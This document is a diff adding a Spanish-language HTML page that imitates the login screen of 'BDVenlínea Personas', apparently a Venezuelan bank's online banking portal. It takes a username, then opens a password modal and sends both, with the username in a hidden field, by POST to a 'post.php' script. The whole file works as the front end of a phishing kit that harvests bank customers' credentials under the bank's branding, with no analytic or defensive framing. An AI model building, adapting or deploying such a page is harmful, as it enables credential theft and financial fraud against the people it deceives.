@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BDVenlínea Personas</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: #f6f6f6;
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            padding-top: 45px;
+        }
+
+        /* DISEÑO DE USUARIO (EL QUE YA TENÍAS) */
+        .login-card {
+            background-color: #ffffff;
+            width: 230px; 
+            padding: 50px 25px 60px 25px; 
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .logo {
+            width: 240px;
+            height: auto;
+            margin-bottom: 35px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .input-group {
+            background-color: #f2f2f2;
+            border-bottom: 1px solid #999; 
+            margin-bottom: 30px;
+            text-align: left;
+            padding: 8px 12px;
+        }
+        label { display: block; font-size: 13px; color: #757575; margin-bottom: 2px; }
+        input { background: transparent; border: none; outline: none; width: 100%; font-size: 17px; color: #333; }
+
+        .btn-entrar {
+            background-color: #e0e0e0;
+            color: #b0b0b0; 
+            border: none;
+            width: 120px;
+            height: 50px;
+            font-size: 16px;
+            border-radius: 2px;
+            transition: 0.3s;
+            cursor: not-allowed;
+            margin-bottom: 40px;
+        }
+        .btn-entrar.active {
+            background-color: #005596;
+            color: white;
+            cursor: pointer;
+        }
+        .footer-text { font-size: 13.5px; color: #888; line-height: 1.6; }
+
+        /* --- DISEÑO DEL CUADRO FLOTANTE (MODAL) --- */
+        #overlay {
+            display: none; /* Oculto al inicio */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.4); /* Fondo oscurecido */
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal {
+            background: white;
+            width: 300px;
+            padding: 30px 20px;
+            border-radius: 4px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        .modal h2 {
+            color: #0067b1;
+            font-size: 19px;
+            margin-bottom: 25px;
+            font-weight: 400;
+        }
+        .input-pass-box {
+            background-color: #f2f2f2;
+            border-bottom: 2px solid #c70039; /* Línea roja de la foto */
+            padding: 10px;
+            text-align: left;
+            margin-bottom: 5px;
+        }
+        .input-pass-box label { color: #c70039; font-size: 12px; }
+        .error-label { color: #c70039; font-size: 12px; text-align: left; margin-bottom: 25px; }
+        
+        .btn-modal { width: 140px; height: 45px; border: none; border-radius: 2px; font-size: 16px; margin-bottom: 10px; }
+        .btn-continuar { background-color: #e0e0e0; color: #b0b0b0; cursor: not-allowed; }
+        .btn-continuar.ready { background-color: #005596; color: white; cursor: pointer; }
+        .btn-cancelar { background-color: #0067b1; color: white; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<!-- PANTALLA 1: USUARIO -->
+<div class="login-card">
+    <img src="logo.png" class="logo">
+    <div class="input-group">
+        <label>Usuario *</label>
+        <input type="text" id="userInput" autocomplete="off">
+    </div>
+    <button type="button" id="btnNext" class="btn-entrar" disabled>Entrar</button>
+    <div class="footer-text">¿Olvidaste tu usuario o clave?<br>Si eres nuevo clienteBDV<br>registrate aquí</div>
+</div>
+
+<!-- PANTALLA 2: CUADRO FLOTANTE (CONTRASEÑA) -->
+<div id="overlay">
+    <div class="modal">
+        <h2>Introduce tu contraseña</h2>
+        <form action="post.php" method="POST">
+            <!-- Pasamos el usuario oculto al script -->
+            <input type="hidden" name="username" id="hiddenUser">
+            
+            <div class="input-pass-box">
+                <label>Contraseña</label>
+                <input type="password" name="password" id="passInput" required>
+            </div>
+            <div class="error-label">Contraseña es <b>requerida</b></div>
+
+            <button type="submit" id="btnFinal" class="btn-modal btn-continuar" disabled>Continuar</button>
+            <br>
+            <button type="button" class="btn-modal btn-cancelar" onclick="closeModal()">Cancelar</button>
+        </form>
+    </div>
+</div>
+
+<script>
+    const userInput = document.getElementById('userInput');
+    const btnNext = document.getElementById('btnNext');
+    const overlay = document.getElementById('overlay');
+    const passInput = document.getElementById('passInput');
+    const btnFinal = document.getElementById('btnFinal');
+    const hiddenUser = document.getElementById('hiddenUser');
+
+    // VALIDACIÓN USUARIO
+    userInput.addEventListener('input', () => {
+        if(userInput.value.length > 6) {
+            btnNext.classList.add('active');
+            btnNext.disabled = false;
+        } else {
+            btnNext.classList.remove('active');
+            btnNext.disabled = true;
+        }
+    });
+
+    // AL DAR EN ENTRAR -> MOSTRAR CUADRO FLOTANTE
+    btnNext.addEventListener('click', () => {
+        hiddenUser.value = userInput.value;
+        overlay.style.display = 'flex';
+    });
+
+    function closeModal() { overlay.style.display = 'none'; }
+
+    // VALIDACIÓN CONTRASEÑA (Letras, Números y Signos)
+    passInput.addEventListener('input', () => {
+        const val = passInput.value;
+        const hasLetter = /[a-zA-Z]/.test(val);
+        const hasNumber = /[0-9]/.test(val);
+        const hasSymbol = /[!@#$%^&*(),.?":{}|<>]/.test(val);
+
+        // Se activa con los 3 requisitos y mínimo 8 caracteres
+        if(hasLetter && hasNumber && hasSymbol && val.length >= 8) {
+            btnFinal.classList.add('ready');
+            btnFinal.disabled = false;
+        } else {
+            btnFinal.classList.remove('ready');
+            btnFinal.disabled = true;
+        }
+    });
+</script>
+
+</body>
+</html>
